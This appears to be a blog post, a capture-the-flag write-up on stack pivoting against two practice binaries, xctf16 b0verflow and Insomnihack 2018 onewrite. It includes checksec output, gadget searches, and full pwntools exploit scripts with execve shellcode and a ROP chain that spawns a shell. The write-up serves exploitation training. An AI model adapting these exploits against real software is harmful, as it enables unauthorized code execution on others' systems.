---
title: "stack pivot"
date: 2020-01-14T09:39:11+08:00
draft: false
---



## xctf16_b0verflow

checksec:

```
[*] '/home/yuuoniy/MY-AEG/nightmare/modules/17-stack_pivot/xctf16_b0verflow/b0verflow'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

Obviously, there is a stack overflow, while the overflow buffer only is 18 byte. as a result, we could utilize stack pivot technique.

we could place our shellcode on string s, then jump to here. so we need a jmp gadget. and hint() has this! (we could also use tool to find it)

```
ROPgadget --binary b0verflow | grep "sub esp"
0x080484fe : mov ebp, esp ; sub esp, 0x24 ; ret
0x080484fd : push ebp ; mov ebp, esp ; sub esp, 0x24 ; ret
0x08048500 : sub esp, 0x24 ; ret
0x08048361 : sub esp, 8 ; call 0x8048439
```

```
16_b0verflow$ ROPgadget --binary b0verflow | grep "jmp esp"
0x08048502 : and al, 0xc3 ; jmp esp
0x08048501 : in al, dx ; and al, 0xc3 ; jmp esp
0x080484ff : in eax, 0x83 ; in al, dx ; and al, 0xc3 ; jmp esp
0x08048504 : jmp esp
```



exp:

```python
from pwn import *

t = process("./b0verflow")
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

jmp_esp = p32(0x08048504)
pivot = p32(0x080484fd)

payload = jmp_esp+shellcode+b"\x00"*(0x20-len(shellcode))+pivot

t.sendline(payload)
t.interactive()
```



# insomnihack 2018 onewrite

```python
[*] '/home/yuuoniy/Desktop/MY-AEG/nightmare/modules/17-stack_pivot/insomnihack18_onewrite/onewrite'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

first analyze the binary, and we have the ability to do leak and overwrite, however, only one time is allowed.

ideas:

1. do partially overwrite to call do_leak multiple times.
2. utilize rop chain to overwrite .fini_array 

for the first time, we leak stack address.

set a breakpoint in do_leak return, and we could get the offset to overwrite the return address

```python
pwndbg> i f
Stack level 0, frame at 0x7fffffffdb28:
 rip = 0x7ffff7d52ab7 in do_leak; saved rip = 0x7ffff7d52b09
 called by frame at 0x7fffffffdb40
 Arglist at 0x7fffffffdb20, args: 
 Locals at 0x7fffffffdb20, Previous frame's sp is 0x7fffffffdb30
 Saved registers:
  rip at 0x7fffffffdb28
```

offset = 0x7fffffffdb28-address we leak = 0x18

```
.text:0000000000008B04                 call    do_leak
.text:0000000000008B09                 nop
```

overwrite 09 to 04, then we could call do_leak multiple times.

after doing this, we could get both stack and PIE address.

next, let's overwrite  .fini_array 

```
0x00007ffff7ff7fb0 - 0x00007ffff7ff7fc0 is .fini_array
```

let's see the content in .fini_array, there are two entries, one we overwrite by  __libc_csu_fini , the other by the address we want.



we need to construct a rop chain like this:

```
pop rdi ptr to "/bin/sh";   ret
pop rsi 0 ; ret
pop rdx 0 ; ret
pop rax 0x59 ; ret
syscall
```

using tool to find gadgets:

```
0x00000000000084fa : pop rdi ; ret
0x000000000000d9f2 : pop rsi ; ret
0x00000000000484c5 : pop rdx ; ret
0x00000000000460ac : pop rax ; ret
0x000000000000917c : syscall
```

and use add rsp gadget to pivot the stack, then execute our rop chain.

so we need to calculate the offset between the stack address we leak and value of rsp when gadget is executed.

next we also need to write 'bin/sh' to .bss,  calculate the offset by 

p address_of_bss - pie_address_we_leak

then we get the offset.

```python
from pwn import *
p = process('./onewrite')
elf = ELF('onewrite')
context.terminal=["tmux","splitw","-h"]
def leak(opt):
    p.recvuntil('>')
    p.sendline(str(opt))
    leak=p.recvline()
    leak = int(leak,16)
    return leak

def write(addr,value):
    p.recvuntil("address :")
    p.send(str(addr))
    p.recvuntil("data :")
    p.send(value)


stack_address = leak(1)
rip_addr = stack_address+0x18
csu_fini_rip = stack_address-72

write(rip_addr,p8(0x4))
do_leak_addr = leak(2)

pie_base = do_leak_addr-elf.symbols['do_leak']
fini_array_addr = pie_base+elf.symbols['__do_global_dtors_aux_fini_array_entry']
csu_fini=pie_base+elf.symbols["__libc_csu_fini"]
do_overwrite = pie_base+elf.symbols['do_overwrite']
   
write(rip_addr,p8(0x4))
leak(1)

write(fini_array_addr+8,p64(do_overwrite))
write(fini_array_addr,p64(do_overwrite))
write(csu_fini_rip,p64(csu_fini))

csu_fini_rip+=8

pop_rdi = pie_base+0x084fa
pop_rsi = pie_base+0x0d9f2
pop_rdx = pie_base+0x0484c5
pop_rax = pie_base+0x460ac
syscall = pie_base+0x917c
binsh_addr = do_leak_addr+0x2aa99b
pivot_gadget = pie_base+0x106f3

def write_qword(addr,val):
    global csu_fini_rip
    write(addr,p64(val))
    write(csu_fini_rip,p64(csu_fini))
    csu_fini_rip+=8

#gdb.attach(p)
write_qword(binsh_addr,u64("/bin/sh\x00"))

write_qword(stack_address+0xd0,pop_rdi)
write_qword(stack_address+0xd8,binsh_addr)
write_qword(stack_address+0xe0,pop_rsi)
write_qword(stack_address+0xe8,0)
write_qword(stack_address+0xf0,pop_rdx)
write_qword(stack_address+0xf8,0)
write_qword(stack_address+0x100,pop_rax)
write_qword(stack_address+0x108,59)
write_qword(stack_address+0x110,syscall)
write(stack_address-0x10,p64(pivot_gadget))

p.interactive()

```



reference:

 https://github.com/guyinatuxedo/nightmare/blob/master/modules/17-stack_pivot/insomnihack18_onewrite/readme.md 